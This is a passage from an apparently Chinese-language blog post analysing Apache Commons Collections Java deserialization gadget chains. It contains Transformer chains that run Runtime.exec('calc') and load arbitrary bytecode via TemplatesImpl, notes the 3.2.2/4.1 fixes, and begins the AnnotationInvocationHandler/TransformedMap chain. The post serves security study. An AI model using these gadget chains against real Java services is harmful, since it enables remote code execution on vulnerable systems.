class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åé¢çš„å›è°ƒ <code>transform</code> æ–¹æ³•ï¼Œå°±æ˜¯æ‰§è¡Œäº† <code>input</code> å¯¹è±¡çš„ <code>iMethodName</code> æ–¹æ³•ï¼Œå¹¶ä¼ å…¥ <code>iArgs</code> å‚æ•°ï¼Œå³ <code>input.iMethod(iArgs)</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€šè¿‡è°ƒç”¨è¾“å…¥å¯¹è±¡çš„æ–¹æ³•å°†è¾“å…¥è½¬æ¢ä¸ºç»“æœã€‚</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  è¦è½¬æ¢çš„è¾“å…¥å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> è½¬æ¢åçš„ç»“æœï¼Œå¦‚æœè¾“å…¥ä¸ºnullåˆ™è¿”å›null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœè¾“å…¥ä¸ºnullï¼Œç›´æ¥è¿”å›null</span></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–è¾“å…¥å¯¹è±¡çš„ç±»ç±»å‹</span></span><br><span class="line">        Class&lt;?&gt; cls = input.getClass();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è·å–ç›®æ ‡æ–¹æ³•ï¼Œæ ¹æ®æ–¹æ³•åå’Œå‚æ•°ç±»å‹</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è°ƒç”¨è¯¥æ–¹æ³•å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p><code>InstantiateTransformer</code> ä¼šæŠŠä¼ å…¥çš„ <code>input</code> çœ‹åšæ˜¯ä¸€ä¸ª <code>Class</code> å¯¹è±¡ï¼Œç„¶åè°ƒç”¨å…¶å¯¹åº”çš„æ„é€ å‡½æ•°å¹¶ä¼ å…¥æŒ‡å®šå‚æ•°æ¥å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> paramTypes  æ„é€ æ–¹æ³•çš„å‚æ•°ç±»å‹æ•°ç»„ï¼Œå‚æ•°ä¸ä¼šè¢«å¤åˆ¶</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args  æ„é€ æ–¹æ³•çš„å‚æ•°æ•°ç»„ï¼Œå‚æ•°ä¸ä¼šè¢«å¤åˆ¶</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€šè¿‡å®ä¾‹åŒ–è¾“å…¥çš„Classå¯¹è±¡æ¥å°†å…¶è½¬æ¢ä¸ºç»“æœã€‚</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  è¦è½¬æ¢çš„è¾“å…¥å¯¹è±¡ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªClasså¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> è½¬æ¢åçš„ç»“æœï¼Œå³é€šè¿‡å®ä¾‹åŒ–Classå¯¹è±¡åˆ›å»ºçš„å®ä¾‹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// æ£€æŸ¥è¾“å…¥æ˜¯å¦æ˜¯Classå¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–Classå¯¹è±¡çš„æ„é€ æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨æŒ‡å®šçš„å‚æ•°ç±»å‹</span></span><br><span class="line">        Constructor&lt;?&gt; con = ((Class&lt;?&gt;) input).getConstructor(iParamTypes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶è¿”å›ç»“æœ</span></span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>ChainedTransformer</code> ä¹Ÿæ˜¯å®ç°äº† <code>Transformer</code> æ¥å£çš„ä¸€ä¸ªç±»ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†å†…éƒ¨çš„å¤šä¸ª <code>Transformer</code> ä¸²åœ¨ä¸€èµ·ã€‚é€šä¿—æ¥è¯´å°±æ˜¯ï¼Œå‰ä¸€ä¸ªå›è°ƒè¿”å›çš„ç»“æœï¼Œä½œä¸ºåä¸€ä¸ªå›è°ƒçš„å‚æ•°ä¼ å…¥ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/ChainedTransformer.svg"
                      alt="ChainedTransformer"
                ></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> transformers  è¦é“¾å¼è°ƒç”¨çš„ transformers æ•°ç»„ï¼Œå‚æ•°ä¸ä¼šè¢«å¤åˆ¶ï¼Œä¸”ä¸èƒ½åŒ…å« null å€¼</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€šè¿‡é“¾å¼è°ƒç”¨æ¯ä¸ª transformerï¼Œå°†è¾“å…¥å¯¹è±¡è½¬æ¢ä¸ºç»“æœã€‚</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  ä¼ é€’ç»™ç¬¬ä¸€ä¸ª transformer çš„è¾“å…¥å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> è½¬æ¢åçš„ç»“æœ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="comment">// æŒ‰é¡ºåºä¾æ¬¡é€šè¿‡æ¯ä¸ª transformer è¿›è¡Œè½¬æ¢</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;  <span class="comment">// è¿”å›æœ€ç»ˆçš„è½¬æ¢ç»“æœ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Transformer-æ„é€ ä»£ç æ‰§è¡Œæµ"><a href="#Transformer-æ„é€ ä»£ç æ‰§è¡Œæµ" class="headerlink" title="Transformer æ„é€ ä»£ç æ‰§è¡Œæµ"></a>Transformer æ„é€ ä»£ç æ‰§è¡Œæµ</h3><h4 id="æ„é€ ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#æ„é€ ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="æ„é€ ä»»æ„ä»£ç æ‰§è¡Œ"></a>æ„é€ ä»»æ„ä»£ç æ‰§è¡Œ</h4><p>æ ¹æ®å‰é¢å¯¹ <code>Transformer</code> çš„ä»‹ç»ï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> æ‹†è§£ä¸º <code>runtime = Runtime.getRuntime()</code> å’Œ <code>runtime.exec(&quot;calc&quot;)</code> ä¸¤éƒ¨åˆ†ï¼Œå› è€Œæœ‰å¦‚ä¸‹æ„é€ ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<p>ç„¶è€Œç”±äº <code>Runtime</code> å¯¹è±¡æ²¡æœ‰å®ç° <code>Serializable</code> æ¥å£ï¼Œå› æ­¤ <code>transformerChain</code> å¯¹è±¡æ˜¯æ— æ³•åºåˆ—åŒ–çš„ï¼Œå› æ­¤æˆ‘ä»¬è¿˜è¦æŠŠ <code>Runtime.getRuntime()</code> æ‹†è§£ä¸º <code>getRuntime = Runtime.class.getMethod(&quot;getRuntime&quot;)</code> å’Œ <code>getRuntime.invoke(null)</code>ã€‚</p>
<p>ç”±äº <code>InvokerTransformer</code> å†…éƒ¨ä¼šå¯¹ä¼ å…¥çš„æ–¹æ³•è°ƒç”¨ <code>getMethod</code> æŸ¥æ‰¾ï¼Œå› æ­¤æ„é€  <code>InvokerTransformer</code> æ—¶ä¼ å…¥çš„å‚æ•°ç±»å‹éœ€è¦ä¸¥æ ¼æŒ‰ç…§ä¼ å…¥çš„æ–¹æ³•åå¯¹åº”çš„æ–¹æ³•çš„å®šä¹‰æ¥ï¼Œä¸”å‚æ•°è¦å’Œå‚æ•°ç±»å‹æ•°é‡ä¸¥æ ¼å¯¹åº”ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå®é™…ä¸Šæˆ‘ä»¬æ„é€ çš„æ˜¯ <code>Runtime.class.getMethod(&quot;getRuntime&quot;, null)</code> å’Œ <code>getRuntime.invoke(null, null)</code>ï¼ˆæ–°æ·»åŠ çš„ <code>null</code> è¡¨ç¤ºç±»å‹æˆ–å‚æ•°æ•°ç»„ï¼‰ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<h4 id="æ„é€ ä»»æ„å­—èŠ‚ç åŠ è½½"><a href="#æ„é€ ä»»æ„å­—èŠ‚ç åŠ è½½" class="headerlink" title="æ„é€ ä»»æ„å­—èŠ‚ç åŠ è½½"></a>æ„é€ ä»»æ„å­—èŠ‚ç åŠ è½½</h4><p><code>TemplatesImpl</code> åŠ è½½ä»»æ„å­—èŠ‚ç æœ‰å¦‚ä¸‹è°ƒç”¨æ ˆï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">main:34, DefineClassExample (com.example)</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•è®©ç¨‹åºæ‰§è¡Œæµç¨‹èƒ½å¤Ÿåˆ°è¾¾è¿™ä¸ªè°ƒç”¨æ ˆä¸­ä»»æ„ä¸€ä¸ªå‡½æ•°å³å¯ï¼Œä¾‹å¦‚ <code>newTransformer</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="Transformer-ååºåˆ—åŒ–ä¿®å¤"><a href="#Transformer-ååºåˆ—åŒ–ä¿®å¤" class="headerlink" title="Transformer ååºåˆ—åŒ–ä¿®å¤"></a>Transformer ååºåˆ—åŒ–ä¿®å¤</h3><p>Apache Commons Collections å®˜æ–¹åœ¨ 2015 å¹´åº•å¾—çŸ¥åºåˆ—åŒ–ç›¸å…³çš„é—®é¢˜åï¼Œå°±åœ¨ä¸¤ä¸ªåˆ†æ”¯ä¸ŠåŒæ—¶å‘å¸ƒäº†æ–°çš„ç‰ˆæœ¬ 4.1 å’Œ 3.2.2ã€‚</p>
<p>3.2.2 ç‰ˆä»£ç ä¸­å¢åŠ äº†ä¸€ä¸ªæ–¹æ³• <code>FunctorUtils#checkUnsafeSerialization</code>ï¼Œç”¨äºæ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ã€‚å¦‚æœå¼€å‘è€…æ²¡æœ‰è®¾ç½®å…¨å±€é…ç½® <code>org.apache.commons.collections.enableUnsafeSerialization=true</code>ï¼Œå³é»˜è®¤æƒ…å†µä¸‹ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>è¿™ä¸ªæ£€æŸ¥åœ¨å¸¸è§çš„å±é™© <code>Transformer</code> ç±»ï¼ˆ<code>InstantiateTransformer</code>ã€<code>InvokerTransformer</code>ã€<code>PrototypeFactory</code>ã€<code>CloneTransformer</code> ç­‰ï¼‰çš„ <code>readObject</code> é‡Œè¿›è¡Œè°ƒç”¨ã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–åŒ…å«è¿™äº›å¯¹è±¡æ—¶å°±ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼š</p>
<blockquote>
<p>Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property â€˜org.apache.commons.collections.enableUnsafeSerializationâ€™ to â€˜trueâ€™, but you must ensure that your application does not de-serialize objects from untrusted sources.</p>
</blockquote>
<p>åœ¨ 4.1 ç‰ˆæœ¬ï¼Œè¿™å‡ ä¸ªå±é™© <code>Transformer</code> ç±»ä¸å†å®ç° <code>Serializable</code> æ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä»–ä»¬å‡ ä¸ªå½»åº•æ— æ³•åºåˆ—åŒ–å’Œååºåˆ—åŒ–äº†ã€‚</p>
<h2 id="ååºåˆ—åŒ–åˆ©ç”¨é“¾"><a href="#ååºåˆ—åŒ–åˆ©ç”¨é“¾" class="headerlink" title="ååºåˆ—åŒ–åˆ©ç”¨é“¾"></a>ååºåˆ—åŒ–åˆ©ç”¨é“¾</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/5a4d01c1d0904b5c8444ceaa2cf42198.png"
                      alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"
                ></p>
<h3 id="CC0"><a href="#CC0" class="headerlink" title="CC0"></a>CC0</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)</span><br><span class="line">at org.apache.commons.collections.map.TransformedMap.checkSetValue(TransformedMap.java:204)</span><br><span class="line">at org.apache.commons.collections.map.AbstractInputCheckedMapDecorator$MapEntry.setValue(AbstractInputCheckedMapDecorator.java:192)</span><br><span class="line">at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:451)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’TransformedMapï¼‰"><a href="#åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’TransformedMapï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’TransformedMapï¼‰"></a>åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’TransformedMapï¼‰</h4><p><code>sun.reflect.annotation.AnnotationInvocationHandler#memberValues</code> æ˜¯ <code>Map</code> ç±»å‹ï¼Œå¯ä»¥è¢« <code>TransformedMap</code> ä¿®é¥°ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¹¶ä¸”åœ¨ <code>AnnotationInvocationHandler#readObject</code> ä¸­ä¼šè°ƒç”¨ <code> memberValue</code> çš„ <code>setValue</code> æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘ <code>TransformedMap</code> ä¸­çš„é”®å€¼å¯¹çš„ <code>transformer</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¯¥æ–¹æ³•æ˜¯ Java åºåˆ—åŒ–æœºåˆ¶çš„â€œå®šåˆ¶ååºåˆ—åŒ–â€å›è°ƒï¼šå½“ AnnotationInvocationHandler</span></span><br><span class="line"><span class="comment">// ä»å­—èŠ‚æµååºåˆ—åŒ–å›æ¥æ—¶ï¼Œå…ˆæ¢å¤å­—æ®µï¼Œå†åšç±»å‹ä¸€è‡´æ€§ä¸å…¼å®¹æ€§æ£€æŸ¥ã€‚</span></span><br><span class="line"><span class="comment">// ç›®çš„ï¼šä¿è¯ååºåˆ—åŒ–åçš„æ³¨è§£ä»£ç†å†…éƒ¨ (type / memberValues) ä¸å½“å‰è¿è¡Œæ—¶çš„æ³¨è§£ç±»å‹å®šä¹‰ä¿æŒä¸€è‡´ã€‚</span></span><br><span class="line"><span class="comment">// è‹¥å‘ç°æˆå‘˜ç±»å‹ä¸åŒ¹é…ï¼Œåˆ™å°†è¯¥æˆå‘˜å€¼æ›¿æ¢ä¸ºä¸€ä¸ªâ€œå¼‚å¸¸ä»£ç†â€ä»¥åœ¨åç»­è®¿é—®æ—¶æŠ›å‡ºæ˜ç¡®å¼‚å¸¸ã€‚</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 1) èµ°é»˜è®¤ååºåˆ—åŒ–æµç¨‹ï¼ŒæŠŠæœ¬ç±»çš„å¯åºåˆ—åŒ–å­—æ®µï¼ˆå¦‚ typeã€memberValuesï¼‰è¯»å›å†…å­˜</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) æ ¡éªŒååºåˆ—åŒ–å¾—åˆ°çš„ type ä»æ˜¯â€œæ³¨è§£ç±»å‹â€ï¼ˆå³ä¸€ä¸ª @interfaceï¼‰</span></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// AnnotationType.getInstance(type) ä¼šåœ¨ type ä¸æ˜¯æ³¨è§£æ¥å£æ—¶æŠ› IllegalArgumentException</span></span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœä¸æ˜¯æ³¨è§£ç±»å‹ï¼Œè¯´æ˜åºåˆ—åŒ–æ•°æ®ä¸å½“å‰ä»£ç 